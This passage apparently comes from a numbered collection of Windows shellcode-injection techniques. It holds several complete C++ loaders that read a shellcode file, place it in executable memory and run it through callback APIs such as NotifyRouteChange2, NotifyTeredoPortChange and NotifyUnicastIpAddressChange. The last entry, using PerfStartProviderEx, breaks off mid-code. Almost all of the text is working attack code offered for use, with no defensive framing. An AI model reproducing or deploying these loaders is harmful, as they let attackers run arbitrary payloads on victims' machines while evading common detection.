<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//&nbsp;Wra7h/FlavorTown</span><br><span class="linenum hljs-number"> 2</span><span class="hljs-comment">//&nbsp;Written/Compiled:&nbsp;Visual&nbsp;Studio&nbsp;2022</span><br><span class="linenum hljs-number"> 3</span><span class="hljs-comment">//&nbsp;Usage:&nbsp;this.exe&nbsp;&lt;shellcode&nbsp;file&gt;</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span>&nbsp;comment(lib,&nbsp;<span class="hljs-meta-string">"Iphlpapi.lib"</span>)</span><br><span class="linenum hljs-number"> 5</span><br><span class="linenum hljs-number"> 6</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 7</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="linenum hljs-number"> 8</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Iphlpapi.h&gt;</span></span><br><span class="linenum hljs-number"> 9</span><br><span class="linenum hljs-number">10</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span></span>;<br><span class="linenum hljs-number">11</span><br><span class="linenum hljs-number">12</span><span class="hljs-function">INT&nbsp;<span class="hljs-title">wmain</span><span class="hljs-params">(INT&nbsp;argc,&nbsp;WCHAR*&nbsp;argv[])</span><br><span class="linenum hljs-number">13</span></span>{<br><span class="linenum hljs-number">14</span>&nbsp;&nbsp;&nbsp;&nbsp;BOOL&nbsp;Ret&nbsp;=&nbsp;FALSE;<br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;SCLen&nbsp;=&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">16</span>&nbsp;&nbsp;&nbsp;&nbsp;PCHAR&nbsp;Shellcode&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">17</span><br><span class="linenum hljs-number">18</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(argc&nbsp;!=&nbsp;<span class="hljs-number">2</span>)<br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">20</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Usage:&nbsp;NotifyRouteChange2.exe&nbsp;C:\\Path\\To\\Shellcode.bin"</span>);<br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">22</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">23</span><br><span class="linenum hljs-number">24</span>&nbsp;&nbsp;&nbsp;&nbsp;Ret&nbsp;=&nbsp;ReadContents(argv[<span class="hljs-number">1</span>],&nbsp;&amp;Shellcode,&nbsp;&amp;SCLen);<br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(!Ret)<br><span class="linenum hljs-number">26</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">27</span><br><span class="linenum hljs-number">28</span>&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;SCLen,<br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(hAlloc,&nbsp;Shellcode,&nbsp;SCLen);<br><span class="linenum hljs-number">32</span><br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hNotification&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;NotifyRouteChange2(AF_INET,&nbsp;hAlloc,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;TRUE,&nbsp;&amp;hNotification);<br><span class="linenum hljs-number">35</span><br><span class="linenum hljs-number">36</span>CLEANUP:<br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(Shellcode)<br><span class="linenum hljs-number">38</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">free</span>(Shellcode);<br><span class="linenum hljs-number">39</span><br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">41</span>}<br><span class="linenum hljs-number">42</span><br><span class="linenum hljs-number">43</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span><br><span class="linenum hljs-number">44</span></span>{<br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;FILE*&nbsp;f&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">46</span>&nbsp;&nbsp;&nbsp;&nbsp;_wfopen_s(&amp;f,&nbsp;Filepath,&nbsp;<span class="hljs-string">L"rb"</span>);<br><span class="linenum hljs-number">47</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(f)<br><span class="linenum hljs-number">48</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_END);<br><span class="linenum hljs-number">50</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*BufferSize&nbsp;=&nbsp;ftell(f);<br><span class="linenum hljs-number">51</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_SET);<br><span class="linenum hljs-number">52</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*Buffer&nbsp;=&nbsp;<span class="hljs-built_in">malloc</span>(*BufferSize);<br><span class="linenum hljs-number">53</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fread(*Buffer,&nbsp;*BufferSize,&nbsp;<span class="hljs-number">1</span>,&nbsp;f);<br><span class="linenum hljs-number">54</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fclose(f);<br><span class="linenum hljs-number">55</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">56</span><br><span class="linenum hljs-number">57</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;(*BufferSize&nbsp;!=&nbsp;<span class="hljs-number">0</span>)&nbsp;?&nbsp;TRUE&nbsp;:&nbsp;FALSE;<br><span class="linenum hljs-number">58</span>}<br></code></pre>
<h1 id="h75notifyteredoportchange"><span>75.回调函数注入 通过 NotifyTeredoPortChange</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//&nbsp;Wra7h/FlavorTown</span><br><span class="linenum hljs-number"> 2</span><span class="hljs-comment">//&nbsp;Written/Compiled:&nbsp;Visual&nbsp;Studio&nbsp;2022</span><br><span class="linenum hljs-number"> 3</span><span class="hljs-comment">//&nbsp;Usage:&nbsp;this.exe&nbsp;&lt;shellcode&nbsp;file&gt;</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span>&nbsp;comment(lib,&nbsp;<span class="hljs-meta-string">"Iphlpapi.lib"</span>)</span><br><span class="linenum hljs-number"> 5</span><br><span class="linenum hljs-number"> 6</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 7</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="linenum hljs-number"> 8</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Iphlpapi.h&gt;</span></span><br><span class="linenum hljs-number"> 9</span><br><span class="linenum hljs-number">10</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span></span>;<br><span class="linenum hljs-number">11</span><br><span class="linenum hljs-number">12</span><span class="hljs-function">INT&nbsp;<span class="hljs-title">wmain</span><span class="hljs-params">(INT&nbsp;argc,&nbsp;WCHAR*&nbsp;argv[])</span><br><span class="linenum hljs-number">13</span></span>{<br><span class="linenum hljs-number">14</span>&nbsp;&nbsp;&nbsp;&nbsp;BOOL&nbsp;Ret&nbsp;=&nbsp;FALSE;<br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;SCLen&nbsp;=&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">16</span>&nbsp;&nbsp;&nbsp;&nbsp;PCHAR&nbsp;Shellcode&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">17</span><br><span class="linenum hljs-number">18</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(argc&nbsp;!=&nbsp;<span class="hljs-number">2</span>)<br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">20</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Usage:&nbsp;NotifyTeredoPortChange.exe&nbsp;C:\\Path\\To\\Shellcode.bin"</span>);<br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">22</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">23</span><br><span class="linenum hljs-number">24</span>&nbsp;&nbsp;&nbsp;&nbsp;Ret&nbsp;=&nbsp;ReadContents(argv[<span class="hljs-number">1</span>],&nbsp;&amp;Shellcode,&nbsp;&amp;SCLen);<br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(!Ret)<br><span class="linenum hljs-number">26</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">27</span><br><span class="linenum hljs-number">28</span>&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;SCLen,<br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(hAlloc,&nbsp;Shellcode,&nbsp;SCLen);<br><span class="linenum hljs-number">32</span><br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hNotification&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;NotifyTeredoPortChange(hAlloc,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;TRUE,&nbsp;&amp;hNotification);<br><span class="linenum hljs-number">35</span><br><span class="linenum hljs-number">36</span>CLEANUP:<br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(Shellcode)<br><span class="linenum hljs-number">38</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">free</span>(Shellcode);<br><span class="linenum hljs-number">39</span><br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">41</span>}<br><span class="linenum hljs-number">42</span><br><span class="linenum hljs-number">43</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span><br><span class="linenum hljs-number">44</span></span>{<br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;FILE*&nbsp;f&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">46</span>&nbsp;&nbsp;&nbsp;&nbsp;_wfopen_s(&amp;f,&nbsp;Filepath,&nbsp;<span class="hljs-string">L"rb"</span>);<br><span class="linenum hljs-number">47</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(f)<br><span class="linenum hljs-number">48</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_END);<br><span class="linenum hljs-number">50</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*BufferSize&nbsp;=&nbsp;ftell(f);<br><span class="linenum hljs-number">51</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_SET);<br><span class="linenum hljs-number">52</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*Buffer&nbsp;=&nbsp;<span class="hljs-built_in">malloc</span>(*BufferSize);<br><span class="linenum hljs-number">53</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fread(*Buffer,&nbsp;*BufferSize,&nbsp;<span class="hljs-number">1</span>,&nbsp;f);<br><span class="linenum hljs-number">54</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fclose(f);<br><span class="linenum hljs-number">55</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">56</span><br><span class="linenum hljs-number">57</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;(*BufferSize&nbsp;!=&nbsp;<span class="hljs-number">0</span>)&nbsp;?&nbsp;TRUE&nbsp;:&nbsp;FALSE;<br><span class="linenum hljs-number">58</span>}<br></code></pre>
<h1 id="h76notifyunicastipaddresschange"><span>76.回调函数注入 通过 NotifyUnicastIpAddressChange</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//&nbsp;Wra7h/FlavorTown</span><br><span class="linenum hljs-number"> 2</span><span class="hljs-comment">//&nbsp;Written/Compiled:&nbsp;Visual&nbsp;Studio&nbsp;2022</span><br><span class="linenum hljs-number"> 3</span><span class="hljs-comment">//&nbsp;Usage:&nbsp;this.exe&nbsp;&lt;shellcode&nbsp;file&gt;</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span>&nbsp;comment(lib,&nbsp;<span class="hljs-meta-string">"Iphlpapi.lib"</span>)</span><br><span class="linenum hljs-number"> 5</span><br><span class="linenum hljs-number"> 6</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 7</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="linenum hljs-number"> 8</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Iphlpapi.h&gt;</span></span><br><span class="linenum hljs-number"> 9</span><br><span class="linenum hljs-number">10</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span></span>;<br><span class="linenum hljs-number">11</span><br><span class="linenum hljs-number">12</span><span class="hljs-function">INT&nbsp;<span class="hljs-title">wmain</span><span class="hljs-params">(INT&nbsp;argc,&nbsp;WCHAR*&nbsp;argv[])</span><br><span class="linenum hljs-number">13</span></span>{<br><span class="linenum hljs-number">14</span>&nbsp;&nbsp;&nbsp;&nbsp;BOOL&nbsp;Ret&nbsp;=&nbsp;FALSE;<br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;SCLen&nbsp;=&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">16</span>&nbsp;&nbsp;&nbsp;&nbsp;PCHAR&nbsp;Shellcode&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">17</span><br><span class="linenum hljs-number">18</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(argc&nbsp;!=&nbsp;<span class="hljs-number">2</span>)<br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">20</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Usage:&nbsp;NotifyUnicastIpAddressChange.exe&nbsp;C:\\Path\\To\\Shellcode.bin"</span>);<br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">22</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">23</span><br><span class="linenum hljs-number">24</span>&nbsp;&nbsp;&nbsp;&nbsp;Ret&nbsp;=&nbsp;ReadContents(argv[<span class="hljs-number">1</span>],&nbsp;&amp;Shellcode,&nbsp;&amp;SCLen);<br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(!Ret)<br><span class="linenum hljs-number">26</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">27</span><br><span class="linenum hljs-number">28</span>&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;SCLen,<br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(hAlloc,&nbsp;Shellcode,&nbsp;SCLen);<br><span class="linenum hljs-number">32</span><br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hNotification&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;NotifyUnicastIpAddressChange(AF_INET,&nbsp;hAlloc,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;TRUE,&nbsp;&amp;hNotification);<br><span class="linenum hljs-number">35</span><br><span class="linenum hljs-number">36</span>CLEANUP:<br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(Shellcode)<br><span class="linenum hljs-number">38</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">free</span>(Shellcode);<br><span class="linenum hljs-number">39</span><br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">41</span>}<br><span class="linenum hljs-number">42</span><br><span class="linenum hljs-number">43</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span><br><span class="linenum hljs-number">44</span></span>{<br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;FILE*&nbsp;f&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">46</span>&nbsp;&nbsp;&nbsp;&nbsp;_wfopen_s(&amp;f,&nbsp;Filepath,&nbsp;<span class="hljs-string">L"rb"</span>);<br><span class="linenum hljs-number">47</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(f)<br><span class="linenum hljs-number">48</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_END);<br><span class="linenum hljs-number">50</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*BufferSize&nbsp;=&nbsp;ftell(f);<br><span class="linenum hljs-number">51</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_SET);<br><span class="linenum hljs-number">52</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*Buffer&nbsp;=&nbsp;<span class="hljs-built_in">malloc</span>(*BufferSize);<br><span class="linenum hljs-number">53</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fread(*Buffer,&nbsp;*BufferSize,&nbsp;<span class="hljs-number">1</span>,&nbsp;f);<br><span class="linenum hljs-number">54</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fclose(f);<br><span class="linenum hljs-number">55</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">56</span><br><span class="linenum hljs-number">57</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;(*BufferSize&nbsp;!=&nbsp;<span class="hljs-number">0</span>)&nbsp;?&nbsp;TRUE&nbsp;:&nbsp;FALSE;<br><span class="linenum hljs-number">58</span>}<br></code></pre>
<h1 id="h77perfstartproviderex"><span>77.回调函数注入 通过 PerfStartProviderEx</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//&nbsp;Wra7h/FlavorTown</span><br><span class="linenum hljs-number"> 2</span><span class="hljs-comment">//&nbsp;Written/Compiled:&nbsp;Visual&nbsp;Studio&nbsp;2022</span><br><span class="linenum hljs-number"> 3</span><span class="hljs-comment">//&nbsp;Usage:&nbsp;this.exe&nbsp;&lt;shellcode&nbsp;file&gt;</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span>&nbsp;comment(lib,&nbsp;<span class="hljs-meta-string">"Advapi32.lib"</span>)</span><br><span class="linenum hljs-number"> 5</span><br><span class="linenum hljs-number"> 6</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 7</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="linenum hljs-number"> 8</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;perflib.h&gt;</span></span><br><span class="linenum hljs-number"> 9</span><br><span class="linenum hljs-number">10</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span></span>;<br><span class="linenum hljs-number">11</span><br><span class="linenum hljs-number">12</span><span class="hljs-function">INT&nbsp;<span class="hljs-title">wmain</span><span class="hljs-params">(INT&nbsp;argc,&nbsp;WCHAR*&nbsp;argv[])</span><br><span class="linenum hljs-number">13</span></span>{<br><span class="linenum hljs-number">14</span>&nbsp;&nbsp;&nbsp;&nbsp;BOOL&nbsp;Ret&nbsp;=&nbsp;FALSE;<br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;SCLen&nbsp;=&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">16</span>&nbsp;&nbsp;&nbsp;&nbsp;PCHAR&nbsp;Shellcode&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">17</span><br><span class="linenum hljs-number">18</span>&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hProvider&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">19</span><br><span class="linenum hljs-number">20</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(argc&nbsp;!=&nbsp;<span class="hljs-number">2</span>)<br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">22</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Usage:&nbsp;PerfStartProviderEx.exe&nbsp;C:\\Path\\To\\Shellcode.bin"</span>);<br><span class="linenum hljs-number">23</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">24</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">25</span><br><span class="linenum hljs-number">26</span>&nbsp;&nbsp;&nbsp;&nbsp;Ret&nbsp;=&nbsp;ReadContents(argv[<span class="hljs-number">1</span>],&nbsp;&amp;Shellcode,&nbsp;&amp;SCLen);<br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(!Ret)<br><span class="linenum hljs-number">28</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">29</span><br><span class="linenum hljs-number">30</span>&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;SCLen,<br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">32</span><br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(hAlloc,&nbsp;Shellcode,&nbsp;SCLen);<br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">const</span>&nbsp;GUID&nbsp;ProviderGuid&nbsp;=<br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;<span 